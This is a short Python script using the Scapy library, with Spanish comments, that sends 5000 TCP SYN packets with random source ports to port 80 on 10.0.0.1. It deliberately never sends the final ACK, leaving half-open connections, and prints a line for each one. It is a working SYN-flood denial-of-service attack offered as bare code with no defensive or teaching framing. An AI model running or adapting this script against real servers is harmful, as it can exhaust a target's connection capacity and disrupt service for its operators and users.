from scapy.all import *

# Dirección IP destino
ip = IP(dst="10.0.0.1")

# Loop para enviar múltiples solicitudes SYN
for i in range(0, 5000):
    # Puerto de origen aleatorio para cada conexión
    sport = RandShort()
    # Construir paquete SYN
    tcp_syn = TCP(sport=sport, dport=80, flags="S", seq=0)
    
    # Enviar SYN y esperar por SYN-ACK, sin enviar ACK
    syn_ack = sr1(ip/tcp_syn, timeout=1, verbose=0)
    
    # Comprobar si se recibió SYN-ACK
    if syn_ack is not None and TCP in syn_ack and syn_ack[TCP].flags == "SA":
        print(f"Conexión semiabierta en el puerto {sport}")
